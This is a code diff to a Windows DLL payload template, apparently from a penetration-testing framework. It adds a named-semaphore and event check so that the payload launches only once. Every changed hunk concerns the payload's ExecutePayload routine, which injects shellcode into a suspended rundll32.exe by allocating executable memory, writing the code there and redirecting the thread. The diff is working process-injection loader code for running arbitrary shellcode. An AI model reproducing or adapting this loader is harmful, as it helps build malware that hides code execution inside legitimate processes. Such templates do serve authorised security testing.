@@ -40,6 +40,50 @@ DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 	return TRUE;
 }
 
+BOOL Synchronize(void) {
+	BOOL bResult = TRUE;
+	BOOL bRelease = FALSE;
+	HANDLE hSemaphore = NULL;
+	HANDLE hEvent = NULL;
+	SECURITY_ATTRIBUTES SecurityAttributes;
+
+	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
+	SecurityAttributes.lpSecurityDescriptor = NULL;
+	SecurityAttributes.bInheritHandle = TRUE;
+
+	do {
+		if ((hSemaphore = CreateSemaphoreA(&SecurityAttributes, 1, 1, szSyncNameS)) == NULL) {
+			break;
+		}
+
+		bResult = FALSE;
+		if (WaitForSingleObject(hSemaphore, 0) == WAIT_TIMEOUT) {
+			break;
+		}
+		bRelease = TRUE;
+
+		if (hEvent = OpenEventA(READ_CONTROL | SYNCHRONIZE, TRUE, szSyncNameE)) {
+			// if the event already exists, do not continue
+			CloseHandle(hEvent);
+			break;
+		}
+
+		if (hEvent = CreateEventA(&SecurityAttributes, TRUE, TRUE, szSyncNameE)) {
+			bResult = TRUE;
+		}
+	} while (FALSE);
+
+
+	if (hSemaphore) {
+		if (bRelease) {
+			ReleaseSemaphore(hSemaphore, 1, NULL);
+		}
+		CloseHandle(hSemaphore);
+	}
+	// do not close the event handle (hEvent), it needs to be inherited
+	return bResult;
+}
+
 void ExecutePayload(void) {
 	int error;
 	PROCESS_INFORMATION pi;
@@ -52,27 +96,28 @@ void ExecutePayload(void) {
 	inline_bzero( &si, sizeof( si ));
 	si.cb = sizeof(si);
 
-	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
-	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
-		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
-		GetThreadContext(pi.hThread, &ctx);
+	if (Synchronize()) {
+		// Create a suspended process, write shellcode into stack, make stack RWX, resume it
+		if (CreateProcess(NULL, "rundll32.exe", NULL, NULL, TRUE, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
+			ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
+			GetThreadContext(pi.hThread, &ctx);
 
-		ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-		WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
+			WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);
 
-#ifdef _WIN64
-		ctx.Rip = (DWORD64)ep;
-#else
-		ctx.Eip = (DWORD)ep;
-#endif
+	#ifdef _WIN64
+			ctx.Rip = (DWORD64)ep;
+	#else
+			ctx.Eip = (DWORD)ep;
+	#endif
 
-		SetThreadContext(pi.hThread,&ctx);
+			SetThreadContext(pi.hThread,&ctx);
 
-		ResumeThread(pi.hThread);
-		CloseHandle(pi.hThread);
-		CloseHandle(pi.hProcess);
+			ResumeThread(pi.hThread);
+			CloseHandle(pi.hThread);
+			CloseHandle(pi.hProcess);
+		}
 	}
-	// ExitProcess(0);
 	ExitThread(0);
 }
